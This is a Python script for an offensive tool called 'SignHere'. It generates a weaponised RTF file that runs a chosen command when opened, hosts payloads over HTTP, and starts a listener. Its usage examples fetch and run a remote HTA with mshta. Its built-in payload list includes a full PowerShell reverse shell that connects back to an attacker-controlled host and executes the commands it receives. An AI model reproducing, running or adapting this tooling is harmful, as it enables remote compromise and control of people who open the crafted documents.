#!/usr/bin/python3

#Imprting default libs
import os
import re
import sys
import textwrap

sys.path.insert(1,"./libs/")
#Importing custom libs
import server
import argparse
import payloadGen
from rtfExploit import rtfGeneration
import listener

banner = (
"""


      ___                       ___           ___           ___           ___           ___           ___     
     /\  \          ___        /\  \         /\__\         /\__\         /\  \         /\  \         /\  \    
    /::\  \        /\  \      /::\  \       /::|  |       /:/  /        /::\  \       /::\  \       /::\  \   
   /:/\ \  \       \:\  \    /:/\:\  \     /:|:|  |      /:/__/        /:/\:\  \     /:/\:\  \     /:/\:\  \  
  _\:\~\ \  \      /::\__\  /:/  \:\  \   /:/|:|  |__   /::\  \ ___   /::\~\:\  \   /::\~\:\  \   /::\~\:\  \ 
 /\ \:\ \ \__\  __/:/\/__/ /:/__/_\:\__\ /:/ |:| /\__\ /:/\:\  /\__\ /:/\:\ \:\__\ /:/\:\ \:\__\ /:/\:\ \:\__\ 
 \:\ \:\ \/__/ /\/:/  /    \:\  /\ \/__/ \/__|:|/:/  / \/__\:\/:/  / \:\~\:\ \/__/ \/_|::\/:/  / \:\~\:\ \/__/ 
  \:\ \:\__\   \::/__/      \:\ \:\__\       |:/:/  /       \::/  /   \:\ \:\__\      |:|::/  /   \:\ \:\__\  
   \:\/:/  /    \:\__\       \:\/:/  /       |::/  /        /:/  /     \:\ \/__/      |:|\/__/     \:\ \/__/  
    \::/  /      \/__/        \::/  /        /:/  /        /:/  /       \:\__\        |:|  |        \:\__\    
     \/__/                     \/__/         \/__/         \/__/         \/__/         \|__|         \/__/    


""")


#class that manage all
class General:
	#parsing arguments and checking them
	def start():
		parser = argparse.ArgumentParser(
		prog="SignHere",
		formatter_class=argparse.RawDescriptionHelpFormatter,
		epilog=textwrap.dedent("""
examples:
        ./SignHere.py --cmd "mshta http://x.x.x.x/payload.hta" --payload executableFile.exe
        ./SignHere.py --cmd "mshta http://x.x.x.x/payload.hta" --powershell 'notepad.exe'

\033[33m			!!WARNING!!
MAX LENGTH OF --cmd MUST BE SMALLER THAN 43 BYTES(CHARS)
IF YOU WANT TO USE BIG COMMANDS YOU CAN USE --powershell
WITH cmd /c command\033[0m
		""")
		)

		#Adding arguments
		parser.add_argument("-c", "--cmd", help='Use for excute in cmd.exe while opening', required=True)
		parser.add_argument("-p", "--payload", help='Generates payload from EXE, ELF, BIN files')
		parser.add_argument("-s", "--powershell", help='Use powershell command as payload')
		parser.add_argument("-o", "--output", help="File that was built (You have to specify the rtf file extension)", required=True)
		parser.add_argument("--port", help="Port to start http server on", default=80, type=int)
		parser.add_argument("--ip", help="Address for binding http server", default="127.0.0.1")
		parser.add_argument("--default-payload", help="Four simple payloads use index from 1 to 4 (1-start notepad; 2-simple rev.shell; 3-message box; 4-iexplorer starts local http server)", type=int)
		parser.add_argument("--listener-port", help="Listener that will check TCP connection if you use backdoor", default=4444, type=int)
		parser.add_argument("--listener-host", help="Host that listener will listen on", default="127.0.0.1")
		parser.add_argument("--temp", help="When you use payload argument this helps you to start small file that under 3kBytes")


                #Namespace for parsed arguments
		args = parser.parse_args()

		#checking payload type
		if args.payload:
			#generate from binary
			payloadGen.request(args.payload, args.ip, args.port)
		elif args.powershell:
			#uses powershell command as payload
			payloadGen.shell(args.powershell)
		elif args.default_payload:
			#Uses default payloads that in General.payloads method you can add your's to the payloadList
			General.payloads(args.default_payload-1, args.ip, args.port, args.listener_host, args.listener_port)
		elif args.temp:
			#Generates base64 encoded binary command for powershell
			payloadGen.base64BIN(args.temp)

		#starting rtf generation
		rtfGeneration.done(args.cmd, args.output)

		try:
			#starting server
			server.Server(args.ip, args.port)
		except KeyboardInterrupt:
			listener.main(args.listener_host, args.listener_port)


	#Default simple payloads
	def payloads(count, ip, port, lIP, lPort):
		payloadList = [
			"start notepad.exe",
			'$client = New-Object System.Net.Sockets.TCPClient' + f'("{lIP}", {lPort});$stream = $client.GetStream();[byte[]]$bytes = 0..65535;' + '|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()',
			"$wshell = New-Object -ComObject Wscript.Shell; $Output = $wshell.Popup('TEST TEST')",
			f"start iexplore.exe http://{ip}:{port}",
		]

		if count >= 0 and count <= len(payloadList):
			payloadGen.shell(payloadList[count])
		else:
			exit("\033[31m[-]\033[0m Payload is out of range")

#Start main class method
banner = re.sub(":", "\033[36m:\033[0m", banner)
print(banner)
General.start()
